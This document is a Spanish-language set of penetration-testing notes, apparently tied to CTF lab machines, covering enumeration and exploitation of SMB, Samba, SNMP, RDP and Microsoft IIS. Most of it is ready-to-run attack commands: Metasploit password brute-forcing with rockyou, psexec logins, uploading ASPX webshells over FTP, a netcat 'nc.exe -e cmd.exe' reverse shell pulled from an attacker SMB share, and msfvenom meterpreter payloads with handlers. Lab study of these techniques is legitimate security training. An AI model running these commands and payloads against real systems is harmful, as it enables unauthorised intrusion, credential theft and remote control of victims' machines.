---
icon: '5'
---

# Enumeración y Explotación del Protócolo SMB, SAMBA, SNMP, IIS y RDP

## Enumeración y Explotación Básica del Protocolo SMB (Puerto 445)

{% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}

Iniciar sesión sino conocemos usuario, es decir, como anónimo.

```
smbclient -L <IP máquina víctima> -N
```

Si conocemos el usuario con su contraseña.

```bash
smbclient -L //<IP máquina víctima> -U 'nombre' 
```

Con la herramienta `smbclient` no se a priori cuál tengo permisos o no. Por lo que usamos `smbmap` para ello.

```bash
smbmap -H <IP máquina víctima> -u 'nombre' -p 'contraseña'
```

Para entrar en un recurso compartido.

```bash
smbclient -U 'mario' //<IP máquina víctima>/Users
```

## Enumeración y Explotación Básica del Protocolo SMB con Metasploit

{% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}

```bash
msfconsole 
use /auxiliary/scanner/smb/smb_login
show options
set RHOSTS <IP máquina víctima>
set VERBOSE false #esto hace que vaya más lento si es true
set SMBUser mario
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

Probar si tenemos acceso en la máquina víctima con este módulo.

```bash
use /exploit/windows/smb/psexec
show options
set RHOSTS <IP máquina víctima>
set SMBUser mario
set SMBPass 123123
run
```

## Enumeración de Usuarios SAMBA y uso de RPCCLIENT

{% embed url="https://vulnyx.com/#discover" %}

```bash
rpcclient -U "" -N <IP máquina víctima>
```

Comandos importantes.

```bash
srvinfo
querydispinfo
enumdomusers
```

```
msfconsole 
show options
set RHOSTS <IP máquina víctima>
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
set SMBUser ken
run
```

```bash
smbmap -H <IP máquina víctima> -u 'ken' -p 'kenken' -r ken
```

## Protocolo RDP en Windows y Enumeración Básica del Sistema

{% embed url="https://tryhackme.com/r/room/investigatingwindows" %}

El RDP es **un protocolo que permite usar un ordenador de escritorio a distancia desde otro ordenador.**

```
xfreerdp /u:Administrator /p:letmein123! /v:<IP máquina víctima>:<PUERTO RDP> 
```

Para ver los usuarios que hay en el sistema.

```bash
net user
```

Para ver la información del usuario.

```
net user <nombre usuario>
```

Para ver quién está en algún grupo concreto.

```
net localgroup Administrators
```

## Enumeración y Explotación del Protocolo SNMP

{% embed url="https://vulnyx.com/#chain" %}

El protocolo SNMP funciona con UDP, por lo que es posible que si hacemos un escaneo de puertos con nmap por UDP nos encontremos con este protocolo funcionando dentro de la máquina objetivo, por lo que para enumerarlo, utilizaremos herramientas como onesixtyone y snmpwalk.

Para encontrar la clave.

```bash
onesixtyone -c /usr/share/wordlists/rockyou.txt <IP máquina víctima>
```

```bash
snmpwalk -v 2c -c <clave encontrada> <IP máquina víctima>
```

## Webshell ASPX en Servidor Microsoft IIS

{% embed url="https://thehackerslabs.com/cocido-andaluz/" %}

Encontramos el archivo en nuestra máquina local.

```bash
find / -name cmdasp.aspx 2>/dev/null
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

```bash
locate .aspx 
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx .
```

Subimos el archivo al servicio FTP.

```bash
put cmdasp.aspx
```

Nos sale para ejecutar un comando por lo que usaremos eso a nuestro favor para la Reverse Shell.

```
find / -name nc.aspx 2>/dev/null
cp /usr/share/windows-resources/binaries/nc.exe
```

```
locate nc.exe
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .
```

Levantamos este recurso compartido para hacer conexión con netcat.

```bash
impacket-smbserver recurso $(pwd) -smb2support
```

Nos ponemos en escucha también.

```bash
nc -nlvp 443
```

Ponemos este comando en el navegador.

```bash
\192.168.0.X\recurso\nc.exe -e cmd.exe 192.168.0.X 443
```

Hemos conseguido una Reverse Shell y estamos en la máquina Windows. A continuación escalamos privilegios.

```bash
msfvenom -p /windows/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=444 -f exe -o shell.exe
```

Nos levantamos otro recurso compartido.

```bash
impacket-smbserver recurso $(pwd) -smb2support
```

En la máquina víctima nos situamos donde tengamos permisos de escritura en concreto en el directorio `/temp`.

```
copy \\<IP máquina atacante>\recurso\shell.exe shell.exe
```

Abrimos **Metasploit**.

```
msfconsole
use multi/handler
show options 
set LHOST <IP máquina atacante>
set LPORT 444 #lo pusimos en el msfvenom
set PAYLOAD /windows/meterpreter/reverse_tcp
run
```

Dentro de la máquina víctima.

```bash
shell.exe
```

## Webshell ASPX en Servidor Microsoft IIS – OPCIÓN 2

Nos creamos un archivo malicioso **.aspx.**

```bash
msfvenom -p /windows/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f aspx -o shell.aspx
```

Iniciamos en FTP mediante **anonymous** o con las credenciales descubiertas. Subimos el archivo.

```bash
put shell.aspx
```

Nos ponemos en escucha también.

```bash
msfconsole
use multi/handler
show options 
set LHOST <IP máquina atacante>
set LPORT 4444 #lo pusimos en el msfvenom
set PAYLOAD /windows/meterpreter/reverse_tcp
run
```

Ejecutamos mediante la URL y conseguimos la conexión con **meterpreter**.

```bash
shell #nos lanzamos una sesión para indagar directorios
```

## Enumeración de HotFixes en Windows

Un [hotfix](https://www.alegsa.com.ar/Dic/hotfix.php) (solución caliente) es un paquete acumulativo que incluye uno o más archivos que son usados para identificar un problema en un programa. En general, son hechos para clientes específicos de un [software](https://www.alegsa.com.ar/Dic/software.php) y no para ser distribuidos ni comercializados.\
\
Específicamente en [Windows](https://www.alegsa.com.ar/Dic/windows.php), los hotfixs son pequeños [parches](https://www.alegsa.com.ar/Dic/parche.php) diseñados para identificar problemas, especialmente agujeros de seguridad que fueron descubiertos recientemente. Estos pequeños programas por lo general se instalan automáticamente a través de Windows Update.\
\
Por lo general un hotfix no es sometido a rigurosas pruebas antes de ser lanzado, pues, como se especificó, suele solucionar problemas críticos que fueron descubiertos recientemente. Por lo tanto, los hotfixs simplemente sirven para solucionar un problema específico, y se recomienda instalarlos sólo cuando se manifieste ese error o problema en la aplicación o sistema operativo.

```bash
Get-HotFix #abrir previamente powershell
```

Para enumerarlos.

```bash
(Get-HotFix).Count
```

```bash
wmic qfe list brief /format:table
```
